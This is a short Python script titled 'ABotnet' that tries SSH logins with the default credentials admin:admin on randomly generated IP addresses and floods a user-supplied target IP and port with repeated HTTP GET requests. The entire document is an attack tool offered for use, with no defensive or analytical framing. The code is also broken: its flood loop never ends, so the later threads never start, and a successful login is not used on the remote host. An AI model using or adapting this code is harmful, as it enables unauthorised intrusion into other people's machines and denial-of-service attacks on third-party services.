import paramiko
import random
import socket
import threading

def bruteforce_ssh(ip, username, password, target_ip, target_port):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password)
        print(f"Access granted for {ip} - {username}:{password}")
        ddos(target_ip, target_port)
        client.close()
    except Exception as e:
        pass

def generate_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def ddos(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
        except Exception as e:
            pass

num_threads = 1000000
print("///ABotnet///")
target_ip = input("Target IP: ")
target_port = int(input("Target Port: "))
for _ in range(num_threads):
    ip_to_bruteforce = generate_random_ip()
    username_to_bruteforce = "admin"
    password_to_bruteforce = "admin"
    threading.Thread(target=bruteforce_ssh, args=(ip_to_bruteforce, username_to_bruteforce, password_to_bruteforce, target_ip, target_port)).start()
    print('<--/Brute Forcing\-->')
    ddos(target_ip, target_port)
